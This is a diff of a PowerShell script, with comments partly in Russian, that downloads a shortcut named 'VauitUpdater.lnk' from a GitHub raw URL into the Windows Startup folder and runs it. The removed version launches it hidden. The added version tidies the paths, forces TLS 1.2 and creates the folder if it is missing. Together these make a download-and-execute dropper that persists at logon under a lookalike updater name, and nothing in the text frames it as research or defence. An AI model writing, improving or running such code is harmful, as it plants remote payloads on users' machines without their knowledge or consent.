@@ -1,12 +1,12 @@
-$url = "https://raw.githubusercontent.com/n7-1/4/refs/heads/main/VauitUpdater.lnk"
-cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
-$destPath = ".\VauitUpdater.lnk"
-try {
-    if (-not (Test-Path $destPath)) {
-        # Используем -ErrorAction Stop, чтобы поймать ошибку в блоке catch
-        Invoke-WebRequest -Uri $url -OutFile $destPath -ErrorAction Stop
-    }
-} catch {
-    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
+$url      = "https://raw.githubusercontent.com/n7-1/4/refs/heads/main/VauitUpdater.lnk"
+$startup  = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
+$destPath = Join-Path $startup "VauitUpdater.lnk"
+
+if (-not (Test-Path $startup)) {
+    New-Item -ItemType Directory -Path $startup -Force | Out-Null
 }
-Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\VauitUpdater.lnk" -WindowStyle Hidden
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri $url -OutFile $destPath -UseBasicParsing
+
+Start-Process -FilePath $destPath
